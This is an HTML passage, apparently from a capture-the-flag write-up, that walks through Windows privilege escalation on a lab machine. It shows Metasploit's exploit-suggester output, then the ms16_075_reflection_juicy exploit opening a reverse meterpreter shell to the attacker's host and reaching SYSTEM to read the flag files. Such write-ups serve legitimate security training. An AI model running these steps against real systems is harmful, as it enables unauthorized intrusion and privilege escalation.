+                &nbsp;&nbsp;&nbsp;SESSION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;session&nbsp;to&nbsp;run&nbsp;this&nbsp;module&nbsp;on<br>
+                &nbsp;&nbsp;&nbsp;SHOWDESCRIPTION&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Displays&nbsp;a&nbsp;detailed&nbsp;description&nbsp;for&nbsp;the&nbsp;available&nbsp;exploits<br>
+                <br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;2<br>
+                SESSION&nbsp;=&gt;&nbsp;2<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.5&nbsp;-&nbsp;Collecting&nbsp;local&nbsp;exploits&nbsp;for&nbsp;x86/windows...<br>
+                [*]&nbsp;10.10.10.5&nbsp;-&nbsp;29&nbsp;exploit&nbsp;checks&nbsp;are&nbsp;being&nbsp;tried...<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/bypassuac_eventvwr:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms10_015_kitrap0d:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms10_092_schelevator:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms13_053_schlamperei:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms13_081_track_popup_menu:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms14_058_track_popup_menu:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms15_004_tswbproxy:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms15_051_client_copy_image:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms16_016_webdav:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms16_032_secondary_logon_handle_privesc:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms16_075_reflection:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ms16_075_reflection_juicy:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.5&nbsp;-&nbsp;exploit/windows/local/ppr_flatten_rec:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [*]&nbsp;Post&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        As expected, there's a bunch of exploits.<br>
+        The exploit that worked for me was - <code>ms16_075_reflection_juicy</code>.<br>
+        <code>set</code> the exploit to target your meterpreter session, <code>set</code> the LHOST and LPORT to that of you attacking machine and <code>exploit</code>.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/local/ms16_075_reflection_juicy<br>
+                msf5&nbsp;exploit(windows/local/ms16_075_reflection_juicy)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;exploit(windows/local/ms16_075_reflection_juicy)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.10.14.8<br>
+                LHOST&nbsp;=&gt;&nbsp;10.10.14.8<br>
+                msf5&nbsp;exploit(windows/local/ms16_075_reflection_juicy)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9002<br>
+                LPORT&nbsp;=&gt;&nbsp;9002<br>
+                msf5&nbsp;exploit(windows/local/ms16_075_reflection_juicy)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.8:9002&nbsp;<br>
+                [*]&nbsp;Launching&nbsp;notepad&nbsp;to&nbsp;host&nbsp;the&nbsp;exploit...<br>
+                [+]&nbsp;Process&nbsp;2012&nbsp;launched.<br>
+                [*]&nbsp;Reflectively&nbsp;injecting&nbsp;the&nbsp;exploit&nbsp;DLL&nbsp;into&nbsp;2012...<br>
+                [*]&nbsp;Injecting&nbsp;exploit&nbsp;into&nbsp;2012...<br>
+                [*]&nbsp;Exploit&nbsp;injected.&nbsp;Injecting&nbsp;exploit&nbsp;configuration&nbsp;into&nbsp;2012...<br>
+                [*]&nbsp;Configuration&nbsp;injected.&nbsp;Executing&nbsp;exploit...<br>
+                [+]&nbsp;Exploit&nbsp;finished,&nbsp;wait&nbsp;for&nbsp;(hopefully&nbsp;privileged)&nbsp;payload&nbsp;execution&nbsp;to&nbsp;complete.<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.5<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(10.10.14.8:9002&nbsp;-&gt;&nbsp;10.10.10.5:49173)&nbsp;at&nbsp;2019-08-27&nbsp;17:55:18&nbsp;+0100<br>
+                <br>
+                meterpreter&nbsp;&gt;
+            </div>
+        </div><br>
+        <br>
+        The exploit should (hopefully) succeed.<br>
+        Check that you have <code>SYSTEM</code> privileges, and go grab <code>user.txt</code> and <code>root.txt</code>.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;getuid<br>
+                Server&nbsp;username:&nbsp;NT&nbsp;AUTHORITY\SYSTEM<br>
+                meterpreter&nbsp;&gt;&nbsp;cd&nbsp;C:/Users<br>
+                meterpreter&nbsp;&gt;&nbsp;ls<br>
+                Listing:&nbsp;C:\Users<br>
+                =================<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;Type&nbsp;&nbsp;Last&nbsp;modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;8192&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-17&nbsp;23:16:43&nbsp;+0000&nbsp;&nbsp;Administrator<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2009-07-14&nbsp;05:53:55&nbsp;+0100&nbsp;&nbsp;All&nbsp;Users<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;8192&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-17&nbsp;23:06:26&nbsp;+0000&nbsp;&nbsp;Classic&nbsp;.NET&nbsp;AppPool<br>
+                40555/r-xr-xr-x&nbsp;&nbsp;&nbsp;8192&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2009-07-14&nbsp;03:37:05&nbsp;+0100&nbsp;&nbsp;Default<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2009-07-14&nbsp;05:53:55&nbsp;+0100&nbsp;&nbsp;Default&nbsp;User<br>
+                40555/r-xr-xr-x&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2009-07-14&nbsp;03:37:05&nbsp;+0100&nbsp;&nbsp;Public<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;8192&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-17&nbsp;14:17:37&nbsp;+0000&nbsp;&nbsp;babis<br>
+                100666/rw-rw-rw-&nbsp;&nbsp;174&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2009-07-14&nbsp;05:41:57&nbsp;+0100&nbsp;&nbsp;desktop.ini<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;cat&nbsp;babis/Desktop/user.txt.txt<br>
+                9ecdd...<br>
+                meterpreter&nbsp;&gt;&nbsp;cat&nbsp;Administrator/Desktop/root.txt.txt<br>
+                e621a...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
